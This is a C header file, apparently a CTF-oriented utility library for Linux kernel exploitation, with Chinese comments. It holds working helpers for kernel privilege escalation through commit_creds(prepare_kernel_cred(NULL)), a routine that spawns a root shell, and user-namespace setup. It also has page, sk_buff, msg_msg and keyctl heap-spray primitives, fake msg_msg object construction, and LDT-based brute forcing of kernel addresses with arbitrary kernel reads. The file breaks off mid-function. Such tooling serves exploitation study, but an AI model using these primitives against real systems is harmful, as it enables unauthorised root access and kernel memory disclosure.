/**
 * @file kernel.h
 * @author arttnba3 (arttnba@gmail.com)
 * @brief arttnba3's personal utils for kernel pwn
 * @version 1.1
 * @date 2023-05-20
 *
 * @copyright Copyright (c) 2023 arttnba3
 *
 */

/**
 * @modification Modified by Cyber_Kaiyo (tgychine@foxmail.com)
 * @date 2025-07-01
 * @brief 做了翻译，以及一些改造
 */

/*
 * 本项目为开源工具头文件，允许自由使用、分发和修改（MIT License）。
 *
 * 本项目依赖系统的 libelf 库（来自
 * elfutils，LGPL-3.0-only），仅通过动态链接方式使用。 libelf
 * 不包含在本项目中，用户需自行安装（如通过 apt 安装 libelf-dev）。
 *
 * 项目地址：
 */

// 编译命令：gcc -masm=intel -no-pie -static -O2 -Wall -o A 1.c

// 基本上要用的参数：
// size_t commit_creds = 0, prepare_kernel_cred = 0;
// size_t kernel_offset;

// size_t user_cs, user_ss, user_rflags, user_sp;

#ifndef A3_KERNEL_PWN_H
#define A3_KERNEL_PWN_H

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <elf.h>
#include <errno.h>
#include <fcntl.h>
#include <gelf.h>
#include <libelf.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <semaphore.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/sem.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

/*
  0. 控制日志输出部分
*/

#define COLOR_RED "\033[31m"
#define COLOR_GREEN "\033[32m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_BLUE "\033[34m"
#define COLOR_RESET "\033[0m"
#define COLOR_BOLD "\033[1m"

#define log_error(fmt, ...)                                                    \
  do {                                                                         \
    fprintf(stderr, COLOR_RED "[x] " fmt COLOR_RESET "\n", ##__VA_ARGS__);     \
  } while (0)

#define log_info(fmt, ...)                                                     \
  do {                                                                         \
    fprintf(stdout, COLOR_BLUE "[*] " fmt COLOR_RESET "\n", ##__VA_ARGS__);    \
  } while (0)

#define log_success(fmt, ...)                                                  \
  do {                                                                         \
    fprintf(stdout, COLOR_GREEN "[+] " fmt COLOR_RESET "\n", ##__VA_ARGS__);   \
  } while (0)

#define log_protection(name, enabled)                                          \
  do {                                                                         \
    fprintf(stdout, "  \033[37m%-12s:\033[0m %s%s%s\n", name,                  \
            (enabled) ? COLOR_GREEN : COLOR_RED, (enabled) ? "启用" : "关闭",  \
            COLOR_RESET);                                                      \
  } while (0)

/**
 * log_fatal - 打印错误信息并退出程序
 *
 * @fmt: 格式化字符串，与 printf 类似
 * @...: 可变参数
 *
 * 输出错误信息（红色高亮），等待几秒，调用 exit(EXIT_FAILURE) 退出。
 */
void err_exit(const char *fmt, ...) {
  va_list args;

  va_start(args, fmt);
  fprintf(stderr, COLOR_RED COLOR_BOLD "[!!!] 发生致命错误 : " COLOR_RESET);
  vfprintf(stderr, fmt, args);
  fprintf(stderr, "\n");
  va_end(args);

  fprintf(stderr, COLOR_RED COLOR_BOLD "正在等待退出 (5s) ...\n" COLOR_RESET);
  sleep(5);
  exit(EXIT_FAILURE);
}

/*
  1. 基本功能
  例如：绑定 CPU 核心、保存用户态寄存器状态等
*/

// 静态内核映像（vmlinux）的基址，KASLR 关闭时常为 0xffffffff81000000
size_t kernel_base = 0xffffffff81000000;

// KASLR 偏移量 = 实际基址 - 静态基址，用于动态修正符号地址
size_t kernel_offset = 0;

// 内核直接映射区（direct mapping region）的起始地址
// 用户空间中的内核泄露地址大多位于该区域
size_t page_offset_base = 0xffff888000000000;

// struct page 的虚拟映射起始地址（vmemmap 区）
// 每个物理页帧都对应一个 struct page 结构体，存放于此区域
size_t vmemmap_base = 0xffffea0000000000;

// init_task 是第一个内核线程（PID 0）的 task_struct 地址
// 用于遍历进程链表、查找当前进程结构体等
size_t init_task;

// init_nsproxy 是默认命名空间的全局指针（struct nsproxy）
// 可用于修复或伪造命名空间结构
size_t init_nsproxy;

// init_cred 是全局 root 权限 cred 对象的地址（struct cred）
// 通常用于提权：将当前进程的 cred 替换为 init_cred
size_t init_cred;

/**
 * direct_map_addr_to_page_addr - 将 direct mapping 地址转换为 struct page
 * 结构地址
 *
 * @direct_map_addr: 直接映射区域中的虚拟地址（通常是内核态访问物理页的地址）
 *
 * 返回该地址对应页的 struct page 结构的虚拟地址。
 *
 * 转换逻辑如下：
 *   1. 首先将地址按页对齐（去除页内偏移）；
 *   2. 减去 page_offset_base 得到其相对页数；
 *   3. 每个页在 vmemmap 区域对应一个 struct page，大小为 0x40 字节；
 *   4. 计算偏移后，加上 vmemmap_base 即可得到对应的 struct page 地址。
 *
 * 用于内核 pwn 中定位页结构体，支持进一步的 flags、refcount 等操作。
 */
size_t direct_map_addr_to_page_addr(size_t direct_map_addr) {
  size_t page_count;
  page_count = ((direct_map_addr & (~0xfff)) - page_offset_base) / 0x1000;
  return vmemmap_base + page_count * 0x40;
}

/**
 * get_root_shell - 提权结果验证器 + 弹 shell 工具
 *
 * 此函数用于在提权操作（如 commit_creds/prepare_kernel_cred）之后调用，
 * 检查当前进程是否为 root 用户（getuid == 0）。
 *
 * - 如果不是 root：输出错误信息并退出；
 * - 如果是 root：输出成功提示并执行 /bin/sh；
 * - shell 退出后，进程也将正常退出。
 */
void get_root_shell(void) {
  log_info("正在检查是否获取 root 权限...");

  if (getuid()) {
    err_exit("未能获得 root 权限！当前uid为%d", getuid());
  }

  log_success("已成功获取 root 权限！");
  log_info("正在执行 /bin/sh ...");
  system("/bin/sh");
  exit(EXIT_SUCCESS);
}

/* 用户态寄存器状态保存变量 */
size_t user_cs;     // 用户态代码段选择子
size_t user_ss;     // 用户态栈段选择子
size_t user_sp;     // 用户态栈指针
size_t user_rflags; // 用户态 EFLAGS 寄存器

/**
 * save_status - 保存当前用户态的上下文状态
 *
 * 该函数用于内核提权漏洞利用中，在进入内核态之前保存当前用户态的关键寄存器值。
 * 包括：
 *   - CS：代码段寄存器（确定从内核返回到用户态时使用的段）
 *   - SS：栈段寄存器
 *   - RSP：当前栈指针
 *   - RFLAGS：标志寄存器（用于恢复中断标志、方向位等）
 *
 * 保存这些信息后，可用于构造 iretq 返回用户态时的完整栈帧。
 */
void save_status(void) {
  asm volatile("mov user_cs, cs;"  // 保存当前代码段
               "mov user_ss, ss;"  // 保存当前栈段
               "mov user_sp, rsp;" // 保存当前栈指针
               "pushf;"            // 压入 RFLAGS
               "pop user_rflags;"  // 弹出到变量中
  );

  log_info("用户态寄存器状态已保存。");
}

/**
 * bind_core - 将当前进程绑定到指定的 CPU 核心上
 *
 * @core: 要绑定的 CPU 编号（从 0 开始）
 *
 * 使用 sched_setaffinity 系统调用设置当前进程的 CPU 亲和性，
 * 限制其只能在指定核心上运行。可用于减少时序扰动或提升稳定性，
 * 常用于 kernel pwn 中构造 race condition 时精确控制调度器行为。
 */
void bind_core(int core) {
  cpu_set_t cpu_set;

  // 清空 CPU 集合并设置目标 core
  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);

  // 尝试绑定当前进程到目标 CPU
  if (sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set) == -1) {
    err_exit("无法将进程绑定到 CPU core %d", core);
  }
  log_info("进程已绑定到 CPU core %d", core);
}

/**
 * get_root_privilige - 提升当前进程权限为 root
 *
 * @prepare_kernel_cred: prepare_kernel_cred 函数地址
 * @commit_creds:        commit_creds 函数地址
 *
 * 通常在内核漏洞中配合 ret2usr 调用：
 *   commit_creds(prepare_kernel_cred(NULL));
 *
 * 该函数通过将当前进程的 credentials 替换为 root cred，
 * 实现无密码提权。
 */
void get_root_privilige(size_t prepare_kernel_cred, size_t commit_creds) {
  // 将地址转为函数指针
  void *(*prepare_kernel_cred_ptr)(void *) =
      (void *(*)(void *))prepare_kernel_cred;

  int (*commit_creds_ptr)(void *) = (int (*)(void *))commit_creds;

  // 实际提权操作：commit_creds(prepare_kernel_cred(NULL));
  commit_creds_ptr(prepare_kernel_cred_ptr(NULL));
}

/**
 * unshare_setup - 创建隔离命名空间环境（user + mount + net）
 *
 * !注意：本函数 **不是** 用于直接提权，
 * 而是为 exploit 操作提供沙箱环境，避免污染全局系统状态。
 *
 * 实现流程：
 *   1. 创建新的 user、mount、network namespace；
 *   2. 写 /proc/self/setgroups 为 deny，避免 GID 映射被拒绝；
 *   3. 设置 UID/GID 映射，将当前用户映射为 namespace 内的 root；
 */
void unshare_setup(void) {
  char edit[0x100];
  int tmp_fd;

  // 创建 user/mount/net namespace
  if (unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET) == -1) {
    log_error("unshare 调用失败");
    exit(EXIT_FAILURE);
  }
  log_info("命名空间已创建");

  // 禁止 setgroups，避免写 gid_map 被拒绝
  tmp_fd = open("/proc/self/setgroups", O_WRONLY);
  if (tmp_fd >= 0) {
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);
  } else {
    log_error("无法写 /proc/self/setgroups");
    exit(EXIT_FAILURE);
  }

  // 设置 UID 映射：将当前用户映射为 namespace 内的 uid 0
  tmp_fd = open("/proc/self/uid_map", O_WRONLY);
  if (tmp_fd >= 0) {
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
  } else {
    log_error("无法写 /proc/self/uid_map");
    exit(EXIT_FAILURE);
  }

  // 设置 GID 映射：将当前用户映射为 namespace 内的 gid 0
  tmp_fd = open("/proc/self/gid_map", O_WRONLY);
  if (tmp_fd >= 0) {
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
  } else {
    log_error("无法写 /proc/self/gid_map");
    exit(EXIT_FAILURE);
  }

  log_info("UID/GID 映射已完成，当前进程为命名空间内 root");
}

/*
  2. 基本结构
  例如: 链表头
*/

struct list_head {
  uint64_t next;
  uint64_t prev;
};

/**
 * III - 与 pgv 页面的喷射（spray）操作相关
 *
 * 注意：我们应当创建两个进程：
 * - 父进程：负责发送指令并执行提权（如获取 root 权限）；
 * - 子进程：调用 unshare_setup() 创建隔离的用户空间环境，
 *            接收来自父进程的指令，并仅执行这些指令。
 */

// 定义最大喷射页数量为 1000 个
#define PGV_PAGE_NUM 1000
// 用于 packet_mmap 利用相关参数
#define PACKET_VERSION 10
#define PACKET_TX_RING 13

// 用于在父子进程间传递“喷射指令”的结构体
// 每个为 (size * nr) bytes，对齐到 PAGE_SIZE
struct pgv_page_request {
  int idx;           // 标识/编号，用于引用某一批已分配页
  int cmd;           // 操作类型（见 enum）
  unsigned int size; // 每个块的大小（通常为页对齐）
  unsigned int nr;   // 要分配的数量
};

/* operations type */
enum {
  CMD_ALLOC_PAGE, // 申请 spray 页（如 mmap 或 packet mmap）
  CMD_FREE_PAGE,  // 释放对应 spray 页
  CMD_EXIT,       // 退出 spray 子进程
};

// 父进程 → 子进程：发送 pgv_page_request 指令
// 	子进程 → 父进程：返回执行状态或 ack
int cmd_pipe_req[2], cmd_pipe_reply[2];

/**
 * create_socket_and_alloc_pages - 创建 AF_PACKET 套接字并分配页喷射内存
 *
 * @size: 每个 block 的大小（建议为页对齐）
 * @nr:   block 的数量（最终分配总大小为 size * nr）
 *
 * 使用 PACKET_TX_RING 创建 ring buffer，通过 mmap 或 kernel 分配方式
 * 在内核中申请大量页，常用于漏洞利用中的页喷射（heap spray）。
 *
 * 返回值：
 *   - 成功：返回创建好的 socket fd；
 *   - 失败：返回负数（系统调用失败码）
 */
int create_socket_and_alloc_pages(unsigned int size, unsigned int nr) {
  // tpacket version 枚举，仅使用 V1
  enum tpacket_versions {
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
  };

  // AF_PACKET 套接字请求结构体
  struct tpacket_req {
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
  };

  struct tpacket_req req;
  int socket_fd, version;
  int ret;

  // 创建 socket(AF_PACKET, SOCK_RAW, PF_PACKET)
  socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
  if (socket_fd < 0) {
    log_error("socket(AF_PACKET, SOCK_RAW, PF_PACKET) 创建失败");
    ret = socket_fd;
    goto err_out;
  }

  // 设置 TPACKET_V1 版本
  version = TPACKET_V1;
  ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, &version,
                   sizeof(version));
  if (ret < 0) {
    log_error("setsockopt(PACKET_VERSION) 设置失败");
    goto err_setsockopt;
  }

  // 初始化页喷射参数
  memset(&req, 0, sizeof(req));
  req.tp_block_size = size;               // 每个 block 的大小
  req.tp_block_nr = nr;                   // block 数量
  req.tp_frame_size = 0x1000;             // 每个 frame 是 1 页
  req.tp_frame_nr = (size * nr) / 0x1000; // 总 frame 数量 = 总大小 / 页大小

  // 设置 PACKET_TX_RING，触发内核分配页
  ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
  if (ret < 0) {
    log_error("setsockopt(PACKET_TX_RING) 设置失败");
    goto err_setsockopt;
  }

  return socket_fd;

err_setsockopt:
  close(socket_fd);
err_out:
  return ret;
}

/**
 * alloc_page - 向 spray 子进程发送页分配请求
 *
 * @idx: 用户自定义的 spray 页编号（用于引用管理）
 * @size: 每个 block 的大小（建议页对齐）
 * @nr: 要分配的 block 数量
 *
 * 本函数应由父进程调用，通过 pipe 向子进程发送 CMD_ALLOC_PAGE 请求，
 * 子进程将调用 create_socket_and_alloc_pages() 完成页喷射。
 *
 * 返回值：
 *   - 成功：>=0（一般为 socket fd）
 *   - 失败：<0（对应系统调用失败码）
 */
int alloc_page(int idx, unsigned int size, unsigned int nr) {
  struct pgv_page_request req = {
      .idx = idx,
      .cmd = CMD_ALLOC_PAGE,
      .size = size,
      .nr = nr,
  };
  int ret;

  // 向子进程发送请求
  if (write(cmd_pipe_req[1], &req, sizeof(req)) != sizeof(req)) {
    log_error("写入 spray 请求失败（alloc_page）");
    return -1;
  }

  // 等待子进程执行结果
  if (read(cmd_pipe_reply[0], &ret, sizeof(ret)) != sizeof(ret)) {
    log_error("读取 spray 回复失败（alloc_page）");
    return -1;
  }

  return ret;
}

/**
 * free_page - 向 spray 子进程发送释放页请求
 *
 * @idx: 要释放的页喷射编号（对应之前 alloc_page() 时传入的 idx）
 *
 * 本函数应由父进程调用，用于请求子进程释放指定 idx 处的喷射资源，
 * 通常通过 close(socket_fd) 或 munmap() 实现。
 *
 * 返回值：
 *   - 成功：>=0（通常为 0）
 *   - 失败：<0（系统调用失败码）
 */
int free_page(int idx) {
  struct pgv_page_request req = {
      .idx = idx,
      .cmd = CMD_FREE_PAGE,
  };
  int ret;

  // 向子进程发送释放请求
  if (write(cmd_pipe_req[1], &req, sizeof(req)) != sizeof(req)) {
    log_error("写入 spray 请求失败（free_page）");
    return -1;
  }

  // 等待子进程回复释放结果
  if (read(cmd_pipe_reply[0], &ret, sizeof(ret)) != sizeof(ret)) {
    log_error("读取 spray 回复失败（free_page）");
    return -1;
  }

  return ret;
}

/**
 * spray_cmd_handler - spray 子进程的命令处理主循环
 *
 * 此函数在子进程中调用：
 *   - 首先调用 unshare_setup() 创建隔离命名空间；
 *   - 然后通过 pipe 循环接收父进程传来的 pgv_page_request；
 *   - 支持 CMD_ALLOC_PAGE / CMD_FREE_PAGE / CMD_EXIT 指令；
 *
 * 所有操作结果通过 cmd_pipe_reply 返回。
 */
void spray_cmd_handler(void) {
  struct pgv_page_request req;
  int socket_fd[PGV_PAGE_NUM] = {0};
  int ret;

  // 在子进程中隔离 user/mount/net namespace
  unshare_setup();

  // 循环处理父进程的请求
  while (1) {
    // 接收请求
    if (read(cmd_pipe_req[0], &req, sizeof(req)) != sizeof(req)) {
      log_error("读取请求失败，退出 spray handler");
      break;
    }

    switch (req.cmd) {
    case CMD_ALLOC_PAGE:
      if (req.idx < 0 || req.idx >= PGV_PAGE_NUM) {
        log_error("CMD_ALLOC_PAGE: 非法 idx = %d", req.idx);
        ret = -1;
      } else {
        ret = create_socket_and_alloc_pages(req.size, req.nr);
        socket_fd[req.idx] = ret;
        log_info("已分配 spray 页 idx=%d fd=%d", req.idx, ret);
      }
      break;

    case CMD_FREE_PAGE:
      if (req.idx < 0 || req.idx >= PGV_PAGE_NUM || socket_fd[req.idx] <= 0) {
        log_error("CMD_FREE_PAGE: 非法 idx = %d", req.idx);
        ret = -1;
      } else {
        ret = close(socket_fd[req.idx]);
        socket_fd[req.idx] = 0;
        log_info("已释放 spray 页 idx=%d", req.idx);
      }
      break;

    case CMD_EXIT:
      log_info("接收到退出指令，spray 子进程即将退出");
      ret = 0;
      write(cmd_pipe_reply[1], &ret, sizeof(ret));
      return;

    default:
      log_error("收到无效指令：cmd = %d", req.cmd);
      ret = -1;
      break;
    }

    // 发送响应
    write(cmd_pipe_reply[1], &ret, sizeof(ret));
  }
}

/**
 * prepare_pgv_system - 初始化 pgv spray 子系统（父进程调用）
 *
 * 功能包括：
 *   1. 创建双向通信管道（父子进程之间）；
 *   2. fork 子进程并在子进程中启动 spray_cmd_handler()；
 *   3. 父进程继续作为主控端，发送 spray 请求。
 */
void prepare_pgv_system(void) {
  pid_t pid;

  // 创建命令请求管道（父 → 子）
  if (pipe(cmd_pipe_req) < 0) {
    log_error("创建 cmd_pipe_req 失败");
    exit(EXIT_FAILURE);
  }

  // 创建命令响应管道（子 → 父）
  if (pipe(cmd_pipe_reply) < 0) {
    log_error("创建 cmd_pipe_reply 失败");
    exit(EXIT_FAILURE);
  }

  // fork 子进程，用于处理喷射指令
  pid = fork();
  if (pid < 0) {
    log_error("fork 失败");
    exit(EXIT_FAILURE);
  }

  if (pid == 0) {
    // 子进程：启动 spray 命令处理器
    spray_cmd_handler();
    _exit(0); // 确保子进程退出
  }

  log_info("pgv spray 子系统已初始化，子进程 PID = %d", pid);
}

/*
4. keyctl 相关部分
 */

/**
 * MUSL 标准库中也没有 `keyctl.h` 头文件 :(
 * 幸运的是，在利用过程中我们只用到少量宏定义，
 * 所以直接手动定义它们也是没问题的 :)
 */

#define KEY_SPEC_PROCESS_KEYRING -2 /* 当前进程的密钥环（keyring）ID */
#define KEYCTL_UPDATE 2             /* 更新指定 key 的 payload 内容 */
#define KEYCTL_REVOKE 3             /* 撤销 key，使其不可再用 */
#define KEYCTL_UNLINK 9             /* 从某个 keyring 中移除 key */
#define KEYCTL_READ 11              /* 读取 key 的内容 */

/**
 * key_alloc - 向当前进程 keyring 中添加一个新的 key
 *
 * @description: key 的名字
 * @payload:     要存储的内容指针
 * @plen:        内容长度
 *
 * 返回值：key ID（成功），或负数表示错误码
 */
int key_alloc(char *description, void *payload, size_t plen) {
  return syscall(__NR_add_key, "user", description, payload, plen,
                 KEY_SPEC_PROCESS_KEYRING);
}

/**
 * key_update - 更新指定 key 的 payload
 *
 * @keyid:   要更新的 key ID
 * @payload: 新的数据
 * @plen:    数据长度
 *
 * 返回值：0（成功）或负数表示错误码
 */
int key_update(int keyid, void *payload, size_t plen) {
  return syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);
}

/**
 * key_read - 读取 key 的内容到用户缓冲区
 *
 * @keyid:   要读取的 key ID
 * @buffer:  读入数据的缓冲区
 * @buflen:  缓冲区大小
 *
 * 返回值：实际读取的字节数或负数表示错误码
 */
int key_read(int keyid, void *buffer, size_t buflen) {
  return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
}

/**
 * key_revoke - 撤销指定 key，使其不可再被访问
 *
 * @keyid: key 的 ID
 *
 * 返回值：0（成功）或负数表示错误码
 */
int key_revoke(int keyid) {
  return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);
}

/**
 * key_unlink - 从当前进程的 keyring 中移除一个 key
 *
 * @keyid: 要移除的 key ID
 *
 * 返回值：0（成功）或负数表示错误码
 */
int key_unlink(int keyid) {
  return syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);
}

/*
5. sk_buff 喷射相关
注意：每个 sk_buff 的尾部包含一个 320 字节的 skb_shared_info 结构
*/

#define SOCKET_NUM 8    // 使用 8 个 socketpair 进行并发喷射
#define SK_BUFF_NUM 128 // 每个 socketpair 写入 128 个数据包（sk_buff）

/**
 * init_socket_array - 初始化 socketpair 数组
 *
 * @sk_socket: 二维数组，每个元素是一个 socketpair [0] 读端 [1] 写端
 *
 * 用 AF_UNIX 创建多个 socketpair，用于后续 sk_buff spray。
 */
int init_socket_array(int sk_socket[SOCKET_NUM][2]) {
  for (int i = 0; i < SOCKET_NUM; i++) {
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_socket[i]) < 0) {
      log_error("failed to create no.%d socket pair!\n", i);
      return -1;
    }
  }
  return 0;
}

/**
 * spray_sk_buff - 向 socket 写入数据以触发 sk_buff 分配
 *
 * @sk_socket: socketpair 数组
 * @buf: 写入的数据内容（由用户控制）
 * @size: 写入的数据大小（应为 PAGE 对齐或 kmalloc-* 目标）
 *
 * 返回值：0 表示 spray 成功，-1 表示失败
 */
int spray_sk_buff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size) {
  for (int i = 0; i < SOCKET_NUM; i++) {
    for (int j = 0; j < SK_BUFF_NUM; j++) {
      if (write(sk_socket[i][0], buf, size) < 0) {
        log_error("failed to spray %d sk_buff for %d socket!\n", j, i);
        return -1;
      }
    }
  }
  return 0;
}

/**
 * free_sk_buff - 从 socket 读出数据以释放 sk_buff 对象
 *
 * @sk_socket: socketpair 数组
 * @buf: 读入的临时缓冲区（可重复利用）
 * @size: 每次读取的大小（应与写入一致）
 *
 * 返回值：0 表示释放成功，-1 表示失败
 */
int free_sk_buff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size) {
  for (int i = 0; i < SOCKET_NUM; i++) {
    for (int j = 0; j < SK_BUFF_NUM; j++) {
      if (read(sk_socket[i][1], buf, size) < 0) {
        log_error("failed to receive sk_buff!");
        return -1;
      }
    }
  }
  return 0;
}

/*
6. msg_msg 相关
*/

#ifndef MSG_COPY
#define MSG_COPY 040000
#endif

// 内核结构体定义
struct msg_msg {
  struct list_head m_list; // 链表指针
  uint64_t m_type;         // 消息类型
  uint64_t m_ts;           // 消息大小
  uint64_t next;     // 下一个 msg_msgseg 的地址（用于长消息）
  uint64_t security; // 安全模块字段（如 SELinux）
};

struct msg_msgseg {
  uint64_t next; // 链式分段消息结构
};

/* 用户态发送消息使用的结构体
struct msgbuf {
    long mtype;     // 消息类型
    char mtext[0];  // 可变大小正文
};
*/

/**
 * get_msg_queue - 创建一个新的 System V 消息队列
 *
 * 使用 msgget() 创建一个私有（IPC_PRIVATE）消息队列，用于 spray msg_msg。
 * 每次调用返回一个新的队列 ID。
 *
 * 返回值：
 *   >0 - 成功返回消息队列 ID；
 *   <0 - 创建失败，返回错误码
 */
int get_msg_queue(void) { return msgget(IPC_PRIVATE, 0666 | IPC_CREAT); }

/**
 * read_msg - 从消息队列中读取一条消息（并删除它）
 *
 * @msqid: 目标消息队列 ID
 * @msgp: 接收数据的缓冲区，应指向 struct msgbuf
 * @msgsz: 要读取的数据长度（不含 mtype）
 * @msgtyp: 读取的消息类型（0 表示任意）
 *
 * 返回值：
 *   >=0 - 实际读取的字节数；
 *   <0  - 读取失败，返回错误码
 */
ssize_t read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  return msgrcv(msqid, msgp, msgsz, msgtyp, 0);
}

/**
 * write_msg - 向消息队列中发送一条消息
 *
 * 注意：msgp 应为 struct msgbuf* 类型，并预留足够空间用于 mtext。
 *
 * @msqid: 目标消息队列 ID
 * @msgp: 消息缓冲区（struct msgbuf 指针）
 * @msgsz: 数据长度（不含 mtype，仅 mtext 部分）
 * @msgtyp: 设置的消息类型（mtype 字段）
 *
 * 返回值：
 *   0  - 成功发送；
 *  -1  - 发送失败，返回错误码
 */
ssize_t write_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  ((struct msgbuf *)msgp)->mtype = msgtyp;
  return msgsnd(msqid, msgp, msgsz, 0);
}

/**
 * peek_msg - 使用 MSG_COPY 从消息队列中复制一条消息内容（不移除）
 *
 * 该操作常用于内核信息泄露漏洞中，以零拷贝方式读取内核中 msg_msg 的数据。
 * 要求内核支持 MSG_COPY（CAP_SYS_ADMIN），否则将失败。
 *
 * @msqid: 消息队列 ID
 * @msgp: 用于接收内容的缓冲区（struct msgbuf 指针）
 * @msgsz: 缓冲区大小
 * @msgtyp: 第几条消息（按编号而非类型）
 *
 * 返回值：
 *   >=0 - 实际读取的字节数；
 *   <0  - 操作失败（权限不足或格式错误）
 */
ssize_t peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  return msgrcv(msqid, msgp, msgsz, msgtyp,
                MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
}

/**
 * build_msg - 构造伪造的 struct msg_msg 内核对象
 *
 * 本函数通常用于在用户空间伪造 spray 内容，模拟真实的 msg_msg 布局，
 * 配合 UAF 或 infoleak 实现对象替换、字段伪造或 fake ROP。
 *
 * @msg: 目标缓冲区，应指向 struct msg_msg
 * @m_list_next: 链表 next 指针
 * @m_list_prev: 链表 prev 指针
 * @m_type: 消息类型
 * @m_ts: 消息正文长度
 * @next: 下一个 msg_msgseg 的地址
 * @security: security 字段（如 SELinux）
 */
void build_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev,
               uint64_t m_type, uint64_t m_ts, uint64_t next,
               uint64_t security) {
  msg->m_list.next = m_list_next;
  msg->m_list.prev = m_list_prev;
  msg->m_type = m_type;
  msg->m_ts = m_ts;
  msg->next = next;
  msg->security = security;
}

/*
 * 第 7 部分 - 与 ldt_struct（本地描述符表）相关的利用
 */

/**
 * 有时候我们可能会使用 MUSL-GCC 编译 exploit，
 * 但 MUSL 并不包含 `asm/ldt.h` 这个头文件。
 * 由于这个头文件很小，我就直接把它的内容复制到这里了 :)
 */

/* 最大支持的 LDT 项数量 */
#define LDT_ENTRIES 8192
/* 每个 LDT 项的大小 */
#define LDT_ENTRY_SIZE 8

#ifndef __ASSEMBLY__

/*
 * 注意：在 64 位系统下，base 和 limit 实际上是无效的，
 * 且不能设置 DS/ES/CS 为非默认值，否则会影响 syscall。
 * 所以此接口主要用于 32 位兼容模式下。
 */
struct user_desc {
  unsigned int entry_number;
  unsigned int base_addr;
  unsigned int limit;
  unsigned int seg_32bit : 1;
  unsigned int contents : 2;
  unsigned int read_exec_only : 1;
  unsigned int limit_in_pages : 1;
  unsigned int seg_not_present : 1;
  unsigned int useable : 1;
#ifdef __x86_64__
  /*
   * 这个字段在 32 位程序中不存在，用户程序可能传入未初始化值。
   * 因此如果从 32 位程序中获取 user_desc，内核会强制忽略 lm。
   */
  unsigned int lm : 1;
#endif
};

#define MODIFY_LDT_CONTENTS_DATA 0
#define MODIFY_LDT_CONTENTS_STACK 1
#define MODIFY_LDT_CONTENTS_CODE 2

#endif /* !__ASSEMBLY__ */

/* 示例地址，取决于目标内核，应手动替换 */
#define SECONDARY_STARTUP_64 0xffffffff81000060

/**
 * init_desc - 初始化 user_desc 描述符结构体
 *
 * @desc: 指向待初始化的 struct user_desc 结构
 */
static inline void init_desc(struct user_desc *desc) {
  desc->base_addr = 0xff0000;
  desc->entry_number = 0x8000 / 8;
  desc->limit = 0;
  desc->seg_32bit = 0;
  desc->contents = 0;
  desc->limit_in_pages = 0;
  desc->lm = 0;
  desc->read_exec_only = 0;
  desc->seg_not_present = 0;
  desc->useable = 0;
}

/**
 * ldt_guessing_direct_mapping_area - 暴力猜测 page_offset_base
 *
 * 通过持续修改 ldt_struct->entries 并调用 SYS_modify_ldt 尝试从
 * 用户态读取对应内核地址，直到命中 direct mapping 区域。
 *
 * @ldt_cracker: 用于使 ldt_struct 可修改的函数
 * @cracker_args: ldt_cracker 的参数
 * @ldt_momdifier: 修改 ldt->entries 的函数
 * @momdifier_args: ldt_momdifier 的参数
 * @burte_size: 每轮尝试的偏移增量
 *
 * 返回值：猜测出的 page_offset_base 地址，失败则返回 -1
 */
size_t ldt_guessing_direct_mapping_area(void *(*ldt_cracker)(void *),
                                        void *cracker_args,
                                        void *(*ldt_momdifier)(void *, size_t),
                                        void *momdifier_args,
                                        uint64_t burte_size) {
  struct user_desc desc;
  uint64_t page_offset_base = 0xffff888000000000;
  uint64_t temp;
  int retval;

  init_desc(&desc);

  log_info("准备使 ldt_struct 可修改...");
  ldt_cracker(cracker_args);
  syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));

  log_info("开始尝试猜测 page_offset_base...");
  while (1) {
    ldt_momdifier(momdifier_args, page_offset_base);
    retval = syscall(SYS_modify_ldt, 0, &temp, 8);
    if (retval > 0) {
      log_success("猜测成功！page_offset_base = 0x%lx", page_offset_base);
      break;
    } else if (retval == 0) {
      log_error("modify_ldt 返回 0，说明 mm->context.ldt 不存在！");
      page_offset_base = -1;
      break;
    }
    page_offset_base += burte_size;
  }

  return page_offset_base;
}

/**
 * ldt_arbitrary_read - 读取任意内核地址的内容
 *
 * 注意：应先调用 ldt_guessing_direct_mapping_area() 获取有效的
 * page_offset_base，并在同一进程上下文中调用本函数。
 *
 * @ldt_momdifier: 修改 ldt_struct->entries 的函数
 * @momdifier_args: 传入该函数的参数
 * @addr: 要读取的内核地址
 * @res_buf: 用于保存读取内容的缓冲区（应至少 0x8000 字节）
 */
void ldt_arbitrary_read(void *(*ldt_momdifier)(void *, size_t),
                        void *momdifier_args, size_t addr, char *res_buf) {
  static char buf[0x8000];
  struct user_desc desc;
  int pipe_fd[2];

  init_desc(&desc);
